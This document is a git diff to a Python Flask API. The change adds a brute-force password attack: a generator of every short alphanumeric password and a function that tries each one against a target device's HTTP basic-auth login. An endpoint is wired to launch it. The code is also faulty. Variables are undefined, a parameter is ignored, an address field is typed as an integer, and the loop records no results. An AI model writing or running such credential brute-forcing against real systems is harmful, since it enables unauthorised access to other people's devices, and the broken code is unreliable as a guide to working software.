@@ -2,13 +2,21 @@ from flask import Flask, request, send_file, jsonify
 from flask_restplus import Resource, Api, reqparse, fields
 from flask_cors import CORS
 
+from werkzeug.exceptions import BadRequest
+
+#from celery import Celery
+
 import time
 import os
 import json
-from werkzeug.exceptions import BadRequest
+import requests
+import time
+from string import digits, ascii_uppercase, ascii_lowercase
+from itertools import product
 
-from celery import Celery
+chars = digits + ascii_uppercase + ascii_lowercase
 
+"""
 def make_celery(app):
     celery = Celery(app.import_name, backend=app.config['CELERY_RESULT_BACKEND'],
                     broker=app.config['CELERY_BROKER_URL'])
@@ -21,12 +29,29 @@ def make_celery(app):
                 return TaskBase.__call__(self, *args, **kwargs)
     celery.Task = ContextTask
     return celery
+"""
+
+def password_generator(digits):
+    for n in range(1, 4 + 1):
+        for comb in product(chars, repeat=n):
+            yield(''.join(comb))
+
+
+def primary_attack(address, digits, resultname):
+    """ address = address of the target device
+        digits = how many digits in the password
+        username = what username to use in the attack
+    """
+    passwords = password_generator(digits)
+    for password in passwords:
+        start = time.perf_counter()
+        req = requests.post(address, auth=(username, password))
+
 
 
 
 def create_app():
     app = Flask(__name__)
-
     CORS(app)
     api = Api(app)
 
@@ -37,7 +62,7 @@ def create_app():
     params = api.model('Params', {
         'address': fields.Integer(readOnly=True, description='Attack target address'),
         'digits': fields.Integer(required=True, description='Number of digits in the password to be brute forced'),
-        'resultname': fields.Integer(required=False, description='Result filename (optional)')
+        'username': fields.Integer(required=True, description='Username to attack')
     })
 
 
@@ -48,7 +73,7 @@ def create_app():
         @ns.expect(params)
         @ns.marshal_with(params)
         def post(self):
-            # Start a celery task doing the task
+            primary_attack(address, digits, username)
             return
 
 
@@ -57,8 +82,9 @@ def create_app():
         """ This endpoint returns results """
         @ns.doc('fetch results')
         def get(self):
-            #return the correct result
+            #return results
             return('results')
+
 
     @ns.route('/results/<string:resultid>')
     class Result(Resource):
